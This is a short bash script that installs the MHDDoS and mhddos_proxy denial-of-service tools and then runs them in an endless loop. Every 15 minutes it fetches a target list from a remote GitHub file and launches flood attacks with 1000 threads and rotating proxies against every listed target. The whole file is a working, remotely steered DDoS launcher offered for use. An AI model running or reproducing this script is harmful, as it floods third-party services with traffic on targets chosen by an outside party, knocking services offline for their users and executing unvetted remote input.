#!/bin/bash
cd ~
rm -r mhddos_proxy
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
python3 -m pip install -r ~/mhddos_proxy/requirements.txt
cd mhddos_proxy
#rm proxies_config.json
#curl -o proxies_config.json https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json 
git clone https://github.com/MHProDev/MHDDoS.git

threads="${1:-1000}"; threads="-t $threads"
rpc="--rpc 2000"
proxy_upd="-p 3600"
debug="--debug"

# Restart attacks and update targets every 15 minutes
while true
do
   pkill -f start.py; pkill -f runner.py 
   # Get number of targets. Sometimes list_size = 0 (network or github problem). So here is check to avoid script error.
   list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
   while [[ $list_size = "0"  ]]
      do
            sleep 5
            list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
      done
   for (( i=1; i<=list_size; i++ ))
      do
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $proxy_upd $debug&
      done
sleep 15m
done
